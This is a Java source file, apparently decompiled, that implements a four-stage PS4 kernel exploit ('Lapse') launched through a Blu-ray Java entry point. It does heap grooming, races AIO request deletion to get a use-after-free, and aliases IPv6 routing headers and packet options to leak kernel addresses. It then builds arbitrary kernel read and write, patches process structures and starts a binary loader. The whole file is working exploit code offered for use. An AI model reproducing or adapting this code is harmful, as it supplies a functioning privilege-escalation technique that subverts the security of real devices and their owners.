package org.bdj.external;

import java.io.PrintStream;
import org.bdj.api.API;
import org.bdj.api.Buffer;
import org.bdj.api.NativeInvoke;


public class Lapse
{
  public static final int MAIN_CORE = 4;
  public static final int MAIN_RTPRIO = 256;
  public static final int NUM_WORKERS = 2;
  public static final int NUM_GROOMS = 512;
  public static final int NUM_SDS = 64;
  public static final int NUM_SDS_ALT = 48;
  public static final int NUM_RACES = 100;
  public static final int NUM_ALIAS = 100;
  public static final int NUM_HANDLES = 256;
  public static final int LEAK_LEN = 16;
  public static final int NUM_LEAKS = 16;
  public static final int NUM_CLOBBERS = 8;
  private static int blockFd = -1;
  private static int unblockFd = -1;
  private static int blockId = -1;
  private static int[] groomIds;
  private static int[] sockets;
  private static int[] socketsAlt;
  private static int previousCore = -1;
  
  private static Kernel.KernelRW kernelRW;
  
  private static long reqs1Addr;
  
  private static long kbufAddr;
  private static long kernelAddr;
  private static int targetId;
  private static int evf;
  private static long fakeReqs3Addr;
  private static int fakeReqs3Sd;
  private static long aioInfoAddr;
  private static PrintStream console;
  private static API api;
  
  static {
    try {
      api = API.getInstance();
    } catch (Exception exception) {
      throw new ExceptionInInitializerError(exception);
    } 
  }
  
  public static class DeleteWorkerThread
    extends Thread {
    private long requestAddr;
    private Buffer errors;
    private int pipeFd;
    private volatile boolean ready = false;
    private volatile boolean completed = false;
    private volatile int workerError = -1;
    
    public DeleteWorkerThread(long param1Long, Buffer param1Buffer, int param1Int) {
      this.requestAddr = param1Long;
      this.errors = param1Buffer;
      this.pipeFd = param1Int;
    }
    
    public void run() {
      try {
        this.ready = true;

        
        Buffer buffer = new Buffer(8);
        Helper.syscall(3, this.pipeFd, buffer.address(), 1L);

        
        Helper.aioMultiDelete(this.requestAddr, 1, this.errors.address() + 4L);
        
        this.workerError = this.errors.getInt(4);
        this.completed = true;
      }
      catch (Exception exception) {
        this.workerError = -1;
        this.completed = true;
      } 
    }
    
    public boolean isReady() { return this.ready; }
    public boolean isCompleted() { return this.completed; } public int getWorkerError() {
      return this.workerError;
    }
  }
  
  private static void initializeExploit() {
    try {
      Kernel.initializeKernelOffsets();
    } catch (Exception exception) {
      throw new RuntimeException("Initialization failed", exception);
    } 
  }


  
  public static boolean performSetup() {
    try {
      previousCore = Helper.getCurrentCore();
      
      if (!Helper.pinToCore(4)) {
        return false;
      }
      
      if (!Helper.setRealtimePriority(256)) {
        return false;
      }


      
      if (!createSocketPair()) {
        return false;
      }

      
      Buffer buffer1 = new Buffer(80);
      buffer1.fill((byte)0);
      
      for (byte b1 = 0; b1 < 2; b1++) {
        int i = b1 * 40;
        buffer1.putInt(i + 8, 1);
        buffer1.putInt(i + 32, blockFd);
      } 
      
      Buffer buffer2 = new Buffer(4);
      long l = Helper.aioSubmitCmd(1, buffer1.address(), 2, 3, buffer2
          .address());
      if (l != 0L) {
        return false;
      }
      
      blockId = buffer2.getInt(0);

      
      byte b2 = 3;
      Buffer buffer3 = Helper.createAioRequests(b2);
      
      groomIds = new int[512];
      byte b3 = 0;
      
      for (byte b4 = 0; b4 < 'Ȁ'; b4++) {
        Buffer buffer = new Buffer(4);
        l = Helper.aioSubmitCmd(1, buffer3.address(), b2, 3, buffer
            .address());
        if (l == 0L) {
          groomIds[b4] = buffer.getInt(0);
          b3++;
        } else {
          groomIds[b4] = 0;
        } 
      } 


      
      cancelGroomAios();
      
      return true;
    }
    catch (Exception exception) {
      return false;
    } 
  }
  
  private static boolean createSocketPair() {
    try {
      Buffer buffer = new Buffer(8);
      long l = Helper.syscall(135, 1L, 1L, 0L, buffer
          .address());
      if (l != 0L) {
        return false;
      }
      
      blockFd = buffer.getInt(0);
      unblockFd = buffer.getInt(4);
      
      return true;
    } catch (Exception exception) {
      return false;
    } 
  }
  
  private static void cancelGroomAios() {
    try {
      Buffer buffer = new Buffer(512);
      
      for (byte b = 0; b < 'Ȁ'; b += 128) {
        int i = Math.min(128, 512 - b);
        Buffer buffer1 = new Buffer(4 * i);
        
        for (byte b1 = 0; b1 < i; b1++) {
          buffer1.putInt(b1 * 4, groomIds[b + b1]);
        }
        
        Helper.aioMultiCancel(buffer1.address(), i, buffer.address());
      } 
    } catch (Exception exception) {}
  }



  
  public static int[] executeStage1() {
    try {
      sockets = new int[64];
      for (byte b1 = 0; b1 < 64; b1++) {
        sockets[b1] = Helper.createUdpSocket();
      }
      
      Buffer buffer1 = new Buffer(16);
      buffer1.fill((byte)0);
      buffer1.putByte(1, (byte)2);
      buffer1.putShort(2, Helper.htons(5050));
      buffer1.putInt(4, Helper.aton("127.0.0.1"));
      
      int i = Helper.createTcpSocket();
      if (i < 0) {
        return null;
      }

      
      Buffer buffer2 = new Buffer(4);
      buffer2.putInt(0, 1);
      Helper.setSockOpt(i, 65535, 4, buffer2, 4);

      
      long l1 = Helper.syscall(104, i, buffer1.address(), 16L);
      if (l1 != 0L) {
        Helper.syscall(6, i);
        return null;
      } 
      
      long l2 = Helper.syscall(106, i, 1L);
      if (l2 != 0L) {
        Helper.syscall(6, i);
        return null;
      } 

      
      byte b2 = 3;
      int j = b2 - 1;
      
      for (byte b3 = 1; b3 <= 100; b3++) {
        
        int k = Helper.createTcpSocket();
        if (k >= 0) {


          
          long l = Helper.syscall(98, k, buffer1
              .address(), 16L);
          if (l != 0L) {
            Helper.syscall(6, k);
          }
          else {
            
            long l3 = Helper.syscall(30, i, 0L, 0L);
            if (l3 < 0L) {
              Helper.syscall(6, k);
            
            }
            else {
              
              Buffer buffer3 = new Buffer(8);
              buffer3.fill((byte)0);
              buffer3.putInt(0, 1);
              buffer3.putInt(4, 1);
              
              Helper.setSockOpt(k, 65535, 128, buffer3, 8);

              
              Buffer buffer4 = Helper.createAioRequests(b2);
              Buffer buffer5 = new Buffer(4 * b2);

              
              buffer4.putInt(j * 40 + 32, k);

              
              long l4 = Helper.aioSubmitCmd(4097, buffer4.address(), b2, 3, buffer5
                  .address());
              if (l4 != 0L) {
                Helper.syscall(6, k);
                Helper.syscall(6, l3);
              }
              else {
                
                Buffer buffer = new Buffer(4 * b2);
                Helper.aioMultiCancel(buffer5.address(), b2, buffer.address());
                Helper.aioMultiPoll(buffer5.address(), b2, buffer.address());

                
                Helper.syscall(6, k);

                
                long l5 = buffer5.address() + (j * 4);
                int[] arrayOfInt = raceOne(l5, (int)l3, sockets);

                
                Helper.aioMultiDelete(buffer5.address(), b2, buffer.address());
                Helper.syscall(6, l3);
                
                if (arrayOfInt != null) {
                  Helper.syscall(6, i);
                  return arrayOfInt;
                } 
                
                if (b3 % 10 == 0)
                  
                  try { Thread.sleep(10L); }
                  catch (InterruptedException interruptedException) { break; }
                   
              } 
            } 
          } 
        } 
      }  Helper.syscall(6, i);
      return null;
    }
    catch (Exception exception) {
      return null;
    } 
  }
  
  private static int[] raceOne(long paramLong, int paramInt, int[] paramArrayOfint) {
    try {
      Buffer buffer1 = new Buffer(8);
      buffer1.putInt(0, -1);
      buffer1.putInt(4, -1);

      
      Buffer buffer2 = new Buffer(8);
      long l = Helper.syscall(135, 1L, 1L, 0L, buffer2
          .address());
      if (l != 0L) {
        return null;
      }
      
      int i = buffer2.getInt(0);
      int j = buffer2.getInt(4);

      
      DeleteWorkerThread deleteWorkerThread = new DeleteWorkerThread(paramLong, buffer1, i);
      deleteWorkerThread.start();

      
      byte b = 0;
      while (!deleteWorkerThread.isReady() && b < 'Ϩ') {
        Thread.yield();
        b++;
      } 
      
      if (!deleteWorkerThread.isReady()) {
        Helper.syscall(6, i);
        Helper.syscall(6, j);
        return null;
      } 

      
      Buffer buffer3 = new Buffer(8);
      Helper.syscall(4, j, buffer3.address(), 1L);

      
      Thread.yield();

      
      Buffer buffer4 = new Buffer(4);
      Helper.aioMultiPoll(paramLong, 1, buffer4.address());
      int k = buffer4.getInt(0);

      
      Buffer buffer5 = new Buffer(256);
      int m = Helper.getSockOpt(paramInt, 6, 32, buffer5, 256);
      boolean bool1 = (m > 0) ? (buffer5.getByte(0) & 0xFF) : true;
      
      boolean bool2 = false;
      
      if (k != -2147352573 && bool1 != 4) {
        
        Helper.aioMultiDelete(paramLong, 1, buffer1.address());
        bool2 = true;
      } 

      
      try {
        deleteWorkerThread.join(2000L);
      } catch (InterruptedException interruptedException) {}



      
      if (bool2 && deleteWorkerThread.isCompleted()) {
        int n = buffer1.getInt(0);
        int i1 = deleteWorkerThread.getWorkerError();


        
        if (n == i1 && n == 0) {
          int[] arrayOfInt = makeAliasedRthdrs(paramArrayOfint);
          
          if (arrayOfInt != null)
          {
            Helper.syscall(6, i);
            Helper.syscall(6, j);
            
            return arrayOfInt;
          }
        
        }
      
      }
      else if (!bool2 || !deleteWorkerThread.isCompleted()) {
      
      } 
      Helper.syscall(6, i);
      Helper.syscall(6, j);
      
      return null;
    }
    catch (Exception exception) {
      return null;
    } 
  }
  
  public static int[] makeAliasedRthdrs(int[] paramArrayOfint) {
    byte b1 = 4;
    char c = '';
    Buffer buffer = new Buffer(c);
    int i = Helper.buildRoutingHeader(buffer, c);
    
    for (byte b2 = 1; b2 <= 100; b2++) {
      byte b;
      for (b = 1; b <= Math.min(paramArrayOfint.length, 64); b++) {
        if (paramArrayOfint[b - 1] >= 0) {
          buffer.putInt(b1, b);
          Helper.setRthdr(paramArrayOfint[b - 1], buffer, i);
        } 
      } 
      
      for (b = 1; b <= Math.min(paramArrayOfint.length, 64); b++) {
        if (paramArrayOfint[b - 1] >= 0) {
          Helper.getRthdr(paramArrayOfint[b - 1], buffer, c);
          int j = buffer.getInt(b1);
          
          if (j != b && j > 0 && j <= 64) {
            int k = j - 1;
            if (k >= 0 && k < paramArrayOfint.length && paramArrayOfint[k] >= 0) {
              int[] arrayOfInt = new int[2];
              arrayOfInt[0] = paramArrayOfint[b - 1];
              arrayOfInt[1] = paramArrayOfint[k];
              
              Helper.removeSocketFromArray(paramArrayOfint, Math.max(b - 1, k));
              Helper.removeSocketFromArray(paramArrayOfint, Math.min(b - 1, k));
              Helper.freeRthdrs(paramArrayOfint);
              
              Helper.addSocketToArray(paramArrayOfint, Helper.createUdpSocket());
              Helper.addSocketToArray(paramArrayOfint, Helper.createUdpSocket());
              
              return arrayOfInt;
            } 
          } 
        } 
      } 
    } 
    
    return null;
  }

  
  public static int[] makeAliasedPktopts(int[] paramArrayOfint) {
    Buffer buffer = new Buffer(4);
    
    byte b1 = 0; byte b2;
    for (b2 = 0; b2 < paramArrayOfint.length; b2++) {
      if (paramArrayOfint[b2] >= 0) {
        b1++;
      }
    } 
    
    if (b1 < 2) {
      return null;
    }
    
    for (b2 = 1; b2 <= 100; b2++) {
      byte b3 = 0; byte b4;
      for (b4 = 1; b4 <= paramArrayOfint.length; b4++) {
        if (paramArrayOfint[b4 - 1] >= 0) {
          buffer.putInt(0, b4);
          Helper.setSockOpt(paramArrayOfint[b4 - 1], 41, 61, buffer, 4);
          b3++;
        } 
      } 
      
      if (b3 == 0) {
        break;
      }
      
      for (b4 = 1; b4 <= paramArrayOfint.length; b4++) {
        if (paramArrayOfint[b4 - 1] >= 0) {
          Helper.getSockOpt(paramArrayOfint[b4 - 1], 41, 61, buffer, 4);
          int i = buffer.getInt(0);
          
          if (i != b4 && i > 0 && i <= paramArrayOfint.length) {
            int j = i - 1;
            if (j >= 0 && j < paramArrayOfint.length && paramArrayOfint[j] >= 0) {
              
              int[] arrayOfInt = new int[2];
              arrayOfInt[0] = paramArrayOfint[b4 - 1];
              arrayOfInt[1] = paramArrayOfint[j];
              
              Helper.removeSocketFromArray(paramArrayOfint, Math.max(b4 - 1, j));
              Helper.removeSocketFromArray(paramArrayOfint, Math.min(b4 - 1, j));
              
              for (byte b = 0; b < 2; b++) {
                int k = Helper.createUdpSocket();
                Helper.setSockOpt(k, 41, 61, buffer, 4);
                Helper.addSocketToArray(paramArrayOfint, k);
              } 
              return arrayOfInt;
            } 
          } 
        } 
      } 
      
      for (b4 = 0; b4 < paramArrayOfint.length; b4++) {
        if (paramArrayOfint[b4] >= 0) {
          Helper.setSockOpt(paramArrayOfint[b4], 41, 25, new Buffer(1), 0);
        }
      } 
    } 
    
    return null;
  }

  
  public static boolean verifyReqs2(Buffer paramBuffer, int paramInt1, int paramInt2) {
    try {
      int i = paramBuffer.getInt(paramInt1);
      if (i != paramInt2) {
        return false;
      }

      
      int[] arrayOfInt = new int[8];
      byte b1 = 0;
      
      int j;
      for (j = 16; j <= 32; j += 8) {
        short s = paramBuffer.getShort(paramInt1 + j + 6);
        if (s != -1) {
          return false;
        }
        if (b1 < arrayOfInt.length) {
          arrayOfInt[b1++] = paramBuffer.getShort(paramInt1 + j + 4) & 0xFFFF;
        }
      } 

      
      j = paramBuffer.getInt(paramInt1 + 56);
      int k = paramBuffer.getInt(paramInt1 + 56 + 4);
      if (j <= 0 || j > 4 || k != 0) {
        return false;
      }

      
      long l = paramBuffer.getLong(paramInt1 + 64);
      if (l != 0L) {
        return false;
      }
      
      int m;
      for (m = 72; m <= 80; m += 8) {
        short s = paramBuffer.getShort(paramInt1 + m + 6);
        if (s == -1) {
          short s1 = paramBuffer.getShort(paramInt1 + m + 4);
          if (s1 != -1 && b1 < arrayOfInt.length) {
            arrayOfInt[b1++] = s1 & 0xFFFF;
          }
        } else if (m == 72 || paramBuffer.getLong(paramInt1 + m) != 0L) {
          return false;
        } 
      } 
      
      if (b1 < 2) {
        return false;
      }

      
      m = arrayOfInt[0];
      for (byte b2 = 1; b2 < b1; b2++) {
        if (arrayOfInt[b2] != m) {
          return false;
        }
      } 
      
      return true;
    } catch (Exception exception) {
      return false;
    } 
  }


  
  public static boolean executeStage2(int[] paramArrayOfint) {
    try {
      int i = paramArrayOfint[0];
      char c1 = 'ࠀ';
      Buffer buffer1 = new Buffer(c1);


      
      Buffer buffer2 = new Buffer(1);

      
      Helper.syscall(6, paramArrayOfint[1]);
      
      evf = -1;
      char c2;
      for (c2 = '\001'; c2 <= 'd'; c2++) {
        int[] arrayOfInt = new int[256];
        
        int i3;
        for (i3 = 0; i3 < 256; i3++) {
          int i4 = 0xF00 | i3 + 1 << 16;
          arrayOfInt[i3] = Helper.createEvf(buffer2.address(), i4);
        } 
        
        Helper.getRthdr(i, buffer1, 128);
        
        i3 = buffer1.getInt(0);
        
        if ((i3 & 0xF00) == 3840) {
          int i4 = i3 >>> 16;
          int i5 = i3 | 0x1;
          
          if (i4 >= 1 && i4 <= arrayOfInt.length) {
            evf = arrayOfInt[i4 - 1];
            
            Helper.setEvfFlags(evf, i5);
            Helper.getRthdr(i, buffer1, 128);
            
            int i6 = buffer1.getInt(0);
            if (i6 != i5)
            {
              
              evf = -1;
            }
          } 
        } 


        
        for (byte b = 0; b < 'Ā'; b++) {
          if (arrayOfInt[b] != evf && arrayOfInt[b] >= 0) {
            try {
              Helper.freeEvf(arrayOfInt[b]);
            } catch (Exception exception) {}
          }
        } 


        
        if (evf != -1) {
          break;
        }
      } 
      
      if (evf == -1) {
        throw new RuntimeException("Failed to confuse evf and rthdr");
      }

      
      Helper.setEvfFlags(evf, 65280);

      
      kernelAddr = buffer1.getLong(40);

      
      kbufAddr = buffer1.getLong(64) - 56L;

      
      c2 = '';
      Buffer buffer3 = new Buffer(c2);
      int j = Helper.buildRoutingHeader(buffer3, c2);
      int k = -559038737;
      byte b1 = 16;
      
      buffer3.putInt(4, k);
      buffer3.putInt(b1 + 0, 1);
      buffer3.putInt(b1 + 4, 0);
      buffer3.putInt(b1 + 8, 3);
      buffer3.putByte(b1 + 12, (byte)0);
      buffer3.putInt(b1 + 40, 108724224);
      buffer3.putLong(b1 + 56, 1L);

      
      byte b2 = 6;
      long l1 = kbufAddr + 4L;
      Buffer buffer4 = Helper.createAioRequests(b2);
      buffer4.putLong(16, l1);
      
      byte b3 = 64;
      int m = b3 * b2;
      Buffer buffer5 = new Buffer(4 * m);
      int n = 4 * b2;
      char c3 = 'ဂ';
      
      long l2 = -1L;
      long l3 = -1L;
      fakeReqs3Sd = -1;
      byte b4;
      for (b4 = 1; b4 <= 16; b4++) {
        int i3;
        
        for (i3 = 1; i3 <= b3; i3++) {
          buffer3.putInt(8, i3);
          Helper.aioSubmitCmd(c3, buffer4.address(), b2, 3, buffer5.address() + ((i3 - 1) * n));
          Helper.setRthdr(sockets[i3 - 1], buffer3, j);
        } 

        
        Helper.getRthdr(i, buffer1, c1);
        
        i3 = -1;
        l2 = -1L;
        l3 = -1L;

        
        for (char c = ''; c < c1; c += '') {
          
          if (l2 == -1L && verifyReqs2(buffer1, c, 2)) {
            l2 = c;
          }

          
          if (l3 == -1L) {
            int i4 = buffer1.getInt(c + 4);
            if (i4 == k) {
              l3 = c;
              i3 = buffer1.getInt(c + 8);
            } 
          } 
        } 
        
        if (l2 != -1L && l3 != -1L && 
          i3 > 0 && i3 <= sockets.length) {
          fakeReqs3Sd = sockets[i3 - 1];
          
          Helper.removeSocketFromArray(sockets, i3 - 1);
          Helper.addSocketToArray(sockets, Helper.createUdpSocket());
          
          Helper.freeRthdrs(sockets);

          
          break;
        } 
        
        Helper.freeAios(buffer5.address(), m, false);
      } 
      
      if (l2 == -1L || l3 == -1L) {
        throw new RuntimeException("Could not leak reqs2 and fake reqs3");
      }

      
      Helper.getRthdr(i, buffer1, c1);

      
      for (b4 = 0; b4 < ''; b4 += 16) {
        StringBuffer stringBuffer = new StringBuffer();
        stringBuffer.append(Helper.toHexString(b4, 8));
        stringBuffer.append(": ");
        for (byte b = 0; b < 16 && b4 + b < 128; b++) {
          int i3 = buffer1.getByte((int)l2 + b4 + b) & 0xFF;
          stringBuffer.append(Helper.toHexString(i3, 2));
          stringBuffer.append(" ");
        } 
      } 
      
      aioInfoAddr = buffer1.getLong((int)l2 + 24);
      
      reqs1Addr = buffer1.getLong((int)l2 + 16);
      reqs1Addr &= 0xFFFFFFFFFFFFFF00L;
      
      fakeReqs3Addr = kbufAddr + l3 + b1;


      
      targetId = -1;
      long l4 = -1L;
      int i1 = -1;
      int i2;
      for (i2 = 0; i2 < m; i2 += b2) {
        Helper.aioMultiCancel(buffer5.address() + (i2 * 4), b2, Helper.AIO_ERRORS.address());
        Helper.getRthdr(i, buffer1, c1);
        
        int i3 = buffer1.getInt((int)l2 + 56);
        if (i3 == 4) {
          targetId = buffer5.getInt(i2 * 4);
          buffer5.putInt(i2 * 4, 0);
          
          int i4 = i2 + b2;
          l4 = buffer5.address() + (i4 * 4);
          i1 = m - i4;
          
          break;
        } 
      } 
      
      if (targetId == -1) {
        throw new RuntimeException("Target id not found");
      }
      
      Helper.cancelAios(l4, i1);
      Helper.freeAios(buffer5.address(), m, false);
      
      return true;
    }
    catch (Exception exception) {
      return false;
    } 
  }


  
  public static int[] executeStage3(int paramInt) {
    char c1 = 'ࠀ';
    Buffer buffer1 = new Buffer(c1);
    
    char c2 = '';
    Buffer buffer2 = Helper.createAioRequests(c2);
    
    byte b1 = 2;
    int i = b1 * c2;
    Buffer buffer3 = new Buffer(4 * i);
    
    boolean bool = true;
    
    Helper.freeEvf(evf);
    char c3;
    for (c3 = '\001'; c3 <= '\b'; c3++) {
      sprayAio(b1, buffer2.address(), c2, buffer3.address(), true, 1);
      
      int i1 = Helper.getRthdr(paramInt, buffer1, c1);
      int i2 = buffer1.getInt(0);
      
      if (i1 == 8 && i2 == 1) {
        bool = false;
        Helper.cancelAios(buffer3.address(), i);
        
        break;
      } 
      Helper.freeAios(buffer3.address(), i, true);
    } 
    
    if (bool) {
      return null;
    }
    
    c3 = '';
    Buffer buffer4 = new Buffer(c3);
    buffer4.fill((byte)0);
    
    int j = Helper.buildRoutingHeader(buffer4, c3);
    
    buffer4.putInt(4, 5);
    buffer4.putLong(24, reqs1Addr);
    buffer4.putLong(32, fakeReqs3Addr);
    
    Buffer buffer5 = new Buffer(4 * c2);
    long[] arrayOfLong = new long[b1]; int k;
    for (k = 0; k < b1; k++) {
      arrayOfLong[k] = buffer3.address() + (k * c2 * 4);
    }

    
    Helper.syscall(6, paramInt);
    
    k = overwriteAioEntryWithRthdr(sockets, buffer4, j, arrayOfLong, c2, buffer5, buffer3.address());
    
    if (k == -1) {
      return null;
    }
    
    Helper.freeAios(buffer3.address(), i, false);
    
    Buffer buffer6 = new Buffer(4);
    buffer6.putInt(0, targetId);
    
    Helper.aioMultiPoll(buffer6.address(), 1, buffer5.address());
    
    byte b2 = 0;
    for (byte b3 = 0; b3 < socketsAlt.length; b3++) {
      if (socketsAlt[b3] >= 0) {
        try {
          Helper.setSockOpt(socketsAlt[b3], 41, 25, new Buffer(1), 0);
          b2++;
        } catch (Exception exception) {}
      }
    } 

    
    Buffer buffer7 = new Buffer(8);
    buffer7.putInt(0, -1);
    buffer7.putInt(4, -1);
    
    Buffer buffer8 = new Buffer(8);
    buffer8.putInt(0, k);
    buffer8.putInt(4, targetId);

    
    Helper.aioMultiDelete(buffer8.address(), 2, buffer7.address());

    
    int[] arrayOfInt = null;
    try {
      arrayOfInt = makeAliasedPktopts(socketsAlt);
      if (arrayOfInt != null);
    
    }
    catch (Exception exception) {}

    
    int m = buffer7.getInt(0);
    int n = buffer7.getInt(4);
    
    buffer5.putInt(0, -1);
    buffer5.putInt(4, -1);
    
    Helper.aioMultiPoll(buffer8.address(), 2, buffer5.address());
    
    if (buffer5.getInt(0) != -2147352573) {
      return null;
    }
    if (m != 0 || m != n) {
      return null;
    }
    
    if (arrayOfInt == null) {
      return null;
    }
    
    return arrayOfInt;
  }
  
  private static void sprayAio(int paramInt1, long paramLong1, int paramInt2, long paramLong2, boolean paramBoolean, int paramInt3) {
    if (paramInt3 == 0) paramInt3 = 1;
    
    int i = 4 * (paramBoolean ? paramInt2 : 1);
    paramInt3 |= paramBoolean ? 4096 : 0;
    
    for (byte b = 0; b < paramInt1; b++) {
      long l = paramLong2 + (b * i);
      Helper.aioSubmitCmd(paramInt3, paramLong1, paramInt2, 3, l);
    } 
  }


  
  private static int overwriteAioEntryWithRthdr(int[] paramArrayOfint, Buffer paramBuffer1, int paramInt1, long[] paramArrayOflong, int paramInt2, Buffer paramBuffer2, long paramLong) {
    for (byte b = 1; b <= 100; b++) {
      
      byte b1 = 0; byte b2;
      for (b2 = 0; b2 < 64 && b2 < paramArrayOfint.length; b2++) {
        if (paramArrayOfint[b2] >= 0) {
          Helper.setRthdr(paramArrayOfint[b2], paramBuffer1, paramInt1);
          b1++;
        } 
      } 
      
      if (b1 == 0) {
        break;
      }
      
      for (b2 = 1; b2 <= paramArrayOflong.length; b2++) {
        int i = b2 - 1;
        try {
          int j;
          for (j = 0; j < paramInt2; j++) {
            paramBuffer2.putInt(j * 4, -1);
          }
          
          Helper.aioMultiCancel(paramArrayOflong[i], paramInt2, paramBuffer2.address());
          
          j = -1; int k;
          for (k = 0; k < paramInt2; k++) {
            int m = paramBuffer2.getInt(k * 4);
            if (m == 3) {
              j = k;
              
              break;
            } 
          } 
          if (j != -1)
          {
            k = (b2 - 1) * paramInt2 + j;
            long l = paramLong + (k * 4);
            
            int m = api.read32(l);

            
            Helper.aioMultiPoll(l, 1, paramBuffer2.address());

            
            api.write32(l, 0);
            
            return m;
          }
        
        } catch (Exception exception) {}
      } 
    } 

    
    return -1;
  }



  
  public static boolean executeStage4(int[] paramArrayOfint1, long paramLong1, long paramLong2, int[] paramArrayOfint2, int[] paramArrayOfint3, long paramLong3) {
    int i = paramArrayOfint1[0];
    Buffer buffer1 = new Buffer(4);
    char c1 = '°';
    
    char c2 = 'Ā';
    Buffer buffer2 = new Buffer(c2);
    int j = Helper.buildRoutingHeader(buffer2, c2);
    long l1 = paramLong1 + 16L;

    
    buffer2.putLong(16, l1);
    
    int k = -1;
    
    Helper.syscall(6, paramArrayOfint1[1]);
    byte b1;
    for (b1 = 1; b1 <= 100; b1++) {
      int n; for (n = 0; n < paramArrayOfint3.length; n++) {
        if (paramArrayOfint3[n] >= 0) {
          int i1 = 0x4141 | n + 1 << 16;
          buffer2.putInt(c1, i1);
          Helper.setRthdr(paramArrayOfint3[n], buffer2, j);
        } 
      } 
      
      Helper.getSockOpt(i, 41, 61, buffer1, 4);
      n = buffer1.getInt(0);
      if ((n & 0xFFFF) == 16705) {
        int i1 = (n >>> 16) - 1;
        if (i1 >= 0 && i1 < paramArrayOfint3.length) {
          k = paramArrayOfint3[i1];
          Helper.removeSocketFromArray(paramArrayOfint3, i1);
          
          break;
        } 
      } 
    } 
    if (k == -1) {
      return false;
    }
    
    b1 = 20;
    Buffer buffer3 = new Buffer(b1);
    buffer3.putLong(0, l1);
    
    Buffer buffer4 = new Buffer(8);



    
    long l2 = Kernel.slowKread8(i, buffer3, b1, buffer4, paramLong2);
    String str = Helper.extractStringFromBuffer(buffer4);
    
    if (!"evf cv".equals(str)) {
      return false;
    }

    
    long l3 = Kernel.slowKread8(i, buffer3, b1, buffer4, paramLong3 + 8L);
    
    if (l3 >>> 48L != 65535L) {
      return false;
    }

    
    long l4 = Kernel.slowKread8(i, buffer3, b1, buffer4, l3 + 176L);
    long l5 = Helper.syscall(20);
    
    if ((l4 & 0xFFFFFFFFL) != l5) {
      return false;
    }

    
    Kernel.addr.curproc = l3;
    Kernel.addr.insideKdata = paramLong2;

    
    long l6 = Kernel.slowKread8(i, buffer3, b1, buffer4, l3 + 72L);
    long l7 = Kernel.slowKread8(i, buffer3, b1, buffer4, l6) + 0L;

    
    int m = Helper.createUdpSocket();
    Buffer buffer5 = new Buffer(b1);

    
    Helper.setSockOpt(m, 41, 46, buffer5, b1);

    
    long l8 = Kernel.getFdDataAddrSlow(i, buffer3, b1, buffer4, m, l7);
    long l9 = Kernel.slowKread8(i, buffer3, b1, buffer4, l8 + 24L);
    long l10 = Kernel.slowKread8(i, buffer3, b1, buffer4, l9 + 280L);

    
    kernelRW = new Kernel.KernelRW(i, m, l7);
    kernelRW.setupPktinfo(l10);
    
    Kernel.setKernelAddresses(l3, l7, paramLong2, 0L);

    
    byte b2 = 104;

    
    for (byte b3 = 0; b3 < paramArrayOfint2.length; b3++) {
      if (paramArrayOfint2[b3] >= 0) {
        long l = kernelRW.getSockPktopts(paramArrayOfint2[b3]);
        kernelRW.kwrite8(l + b2, 0L);
      } 
    } 
    
    long l11 = kernelRW.getSockPktopts(k);
    kernelRW.kwrite8(l11 + b2, 0L);
    
    long l12 = kernelRW.getSockPktopts(m);
    kernelRW.kwrite8(l12 + b2, 0L);

    
    int[] arrayOfInt = { i, m, k };
    
    for (byte b4 = 0; b4 < arrayOfInt.length; b4++) {
      long l = kernelRW.getFdDataAddr(arrayOfInt[b4]);
      kernelRW.kwrite32(l + 0L, 256);
    } 
    
    return true;
  }




  
  public static void cleanup() {
    try {
      if (blockFd >= 0) {
        Helper.syscall(6, blockFd);
        blockFd = -1;
      } 
      if (unblockFd >= 0) {
        Helper.syscall(6, unblockFd);
        unblockFd = -1;
      } 

      
      if (groomIds != null) {
        Buffer buffer = new Buffer(512);
        
        for (byte b = 0; b < 'Ȁ'; b += 128) {
          int i = Math.min(128, 512 - b);
          Buffer buffer1 = new Buffer(4 * i);
          
          for (byte b1 = 0; b1 < i; b1++) {
            buffer1.putInt(b1 * 4, groomIds[b + b1]);
          }

          
          Helper.aioMultiPoll(buffer1.address(), i, buffer.address());
          Helper.aioMultiDelete(buffer1.address(), i, buffer.address());
        } 
        groomIds = null;
      } 

      
      if (blockId >= 0) {
        Buffer buffer1 = new Buffer(4);
        buffer1.putInt(0, blockId);
        Buffer buffer2 = new Buffer(4);
        
        Helper.aioMultiWait(buffer1.address(), 1, buffer2.address(), 1, 0L);
        Helper.aioMultiDelete(buffer1.address(), 1, buffer2.address());
        blockId = -1;
      } 

      
      if (sockets != null) {
        for (byte b = 0; b < sockets.length; b++) {
          if (sockets[b] >= 0) {
            Helper.syscall(6, sockets[b]);
            sockets[b] = -1;
          } 
        } 
        sockets = null;
      } 

      
      if (socketsAlt != null) {
        for (byte b = 0; b < socketsAlt.length; b++) {
          if (socketsAlt[b] >= 0) {
            Helper.syscall(6, socketsAlt[b]);
            socketsAlt[b] = -1;
          } 
        } 
        socketsAlt = null;
      } 

      
      if (previousCore >= 0) {
        Helper.pinToCore(previousCore);
        previousCore = -1;
      } 

      
      if (Kernel.addr != null) {
        Kernel.addr.reset();
      }
      kernelRW = null;
    }
    catch (Exception exception) {}
  }

  
  public static int main(PrintStream paramPrintStream) {
    console = paramPrintStream;
    try {
      initializeExploit();
      
      if (Helper.isJailbroken()) {
        NativeInvoke.sendNotificationRequest("Already Jailbroken");
        return 0;
      } 
      
      if (!performSetup()) {
        cleanup();
        return -3;
      } 

      
      socketsAlt = new int[48];
      for (byte b = 0; b < 48; b++) {
        socketsAlt[b] = Helper.createUdpSocket();
      }
      
      int[] arrayOfInt1 = executeStage1();
      if (arrayOfInt1 == null) {
        cleanup();
        return -4;
      } 
      
      if (!executeStage2(arrayOfInt1)) {
        cleanup();
        return -5;
      } 
      
      int[] arrayOfInt2 = executeStage3(arrayOfInt1[0]);
      if (arrayOfInt2 == null) {
        cleanup();
        return -6;
      } 
      Helper.syscall(6, fakeReqs3Sd);
      
      if (!executeStage4(arrayOfInt2, reqs1Addr, kernelAddr, sockets, socketsAlt, aioInfoAddr)) {
        cleanup();
        return -7;
      } 
      
      if (!Kernel.postExploitationPS4()) {
        cleanup();
        return -8;
      } 
      
      cleanup();
      BinLoader.start();
      return 0;
    }
    catch (Exception exception) {
      cleanup();
      
      return -10;
    } 
  }
}
